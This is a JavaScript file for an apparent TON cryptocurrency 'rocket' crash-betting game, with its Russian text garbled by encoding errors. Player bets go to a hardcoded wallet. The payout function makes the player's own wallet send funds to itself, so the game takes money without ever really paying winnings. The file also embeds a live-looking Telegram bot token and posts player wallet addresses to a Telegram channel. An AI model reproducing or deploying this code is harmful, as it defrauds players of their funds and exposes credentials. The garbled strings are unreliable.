const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://qyvirkot.github.io/notcoin/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;
let gameRunning = false;
let multiplier = 1.00;
let rocketSpeed = 5;
let gameInterval;
let betAmount = 0;
const mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('–ê–¥—Ä–µ—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:', walletAddress);
    }
});

async function startGame() {
    if (!walletAddress) return alert("–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫!");
    
    betAmount = parseFloat(document.getElementById("betAmount").value);
    if (isNaN(betAmount) || betAmount <= 0) return alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—Ç–∞–≤–∫—É!");

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞–≤–∫–∏
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [
            { address: mainWallet, amount: betAmount * 1000000000 },
        ],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`–°—Ç–∞–≤–∫–∞ ${betAmount} TON –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`);
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ TON:", error);
        return;
    }

    // –ó–∞–ø—É—Å–∫ –∏–≥—Ä—ã
    gameRunning = true;
    multiplier = 1.00;
    rocketSpeed = 5;
    document.getElementById("multiplier").innerText = multiplier.toFixed(2);
    
    let rocket = document.getElementById("rocket");
    rocket.style.bottom = "10px";

    gameInterval = setInterval(() => {
        if (!gameRunning) return;
        multiplier += 0.05;
        rocketSpeed += 1;
        document.getElementById("multiplier").innerText = multiplier.toFixed(2);
        
        // –î–≤–∏–≥–∞–µ–º —Ä–∞–∫–µ—Ç—É –≤–≤–µ—Ä—Ö
        let currentBottom = parseInt(rocket.style.bottom) || 10;
        rocket.style.bottom = `${currentBottom + rocketSpeed}px`;

        // –ü—Ä–æ–∏–≥—Ä—ã—à –ø—Ä–∏ —Å–ª—É—á–∞–π–Ω–æ–º —Å–æ–±—ã—Ç–∏–∏
        if (Math.random() < 0.02 * (multiplier / 2)) {
            gameRunning = false;
            clearInterval(gameInterval);
            alert("üöÄ –†–∞–∫–µ—Ç–∞ –≤–∑–æ—Ä–≤–∞–ª–∞—Å—å! –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏.");
        }
    }, 500);
}

function stopGame() {
    if (!gameRunning) return;
    gameRunning = false;
    clearInterval(gameInterval);
    
    alert(`üéâ –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! –í–∞—à –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç: ${multiplier.toFixed(2)}x`);
    
    let winAmount = betAmount * multiplier;
    
    sendToTelegram(`‚úÖ –ò–≥—Ä–æ–∫ <code>${walletAddress}</code> –≤—ã–∏–≥—Ä–∞–ª <b>${winAmount.toFixed(2)} TON</b>`);
    
    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤—ã–∏–≥—Ä—ã—à–∞ –∏–≥—Ä–æ–∫—É
    sendWinTransaction(winAmount);
}

async function sendWinTransaction(amount) {
    if (!walletAddress) return;

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [
            { address: walletAddress, amount: Math.floor(amount * 1000000000) },
        ],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`–í—ã–ø–ª–∞—á–µ–Ω–æ ${amount.toFixed(2)} TON`);
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–ª–∞—Ç–µ –≤—ã–∏–≥—Ä—ã—à–∞:", error);
    }
}

async function sendToTelegram(message) {
    const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
    const chatId = "@ppjjkkd";

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
    }
}
